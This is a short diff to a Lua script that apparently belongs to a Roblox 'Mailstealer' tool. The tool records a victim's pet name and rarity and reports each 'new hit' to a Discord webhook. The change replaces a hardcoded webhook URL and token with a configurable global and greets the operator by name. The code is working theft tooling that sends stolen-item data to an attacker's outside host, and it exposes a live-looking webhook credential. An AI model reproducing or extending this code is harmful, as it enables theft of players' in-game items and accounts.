@@ -21,7 +21,7 @@ _G.PetName = v2.name
 _G.PetRar = v2.rarity
 local function sendwebhook()
     local msg = {
-        ["content"] = "|| @everyone ||**Hello HosteeSciptz, Hostee Scriptz Mailstealer has detected a new hit!**",
+        ["content"] = "|| @everyone ||**Hello ".. _G.UserName .. ", Hostee Scriptz Mailstealer has detected a new hit!**",
         ["embeds"] = {
             {
                 ["title"] = "Hostee Scriptz Mailstealer Results",
@@ -45,7 +45,7 @@ local function sendwebhook()
         ["attachments"] = {}
     }
     
-    local Webhook = "https://discord.com/api/webhooks/1114164888147861534/2pnRiDU0gcz60oWnVlycPWUce7uuaZtcuAAEu6K9dMxcY4SLyehxhGDwmJwaptI74q2e"
+    local Webhook = _G.WebHook
     local request = http_request or request or HttpPost or syn.request
     request({
         Url = Webhook,
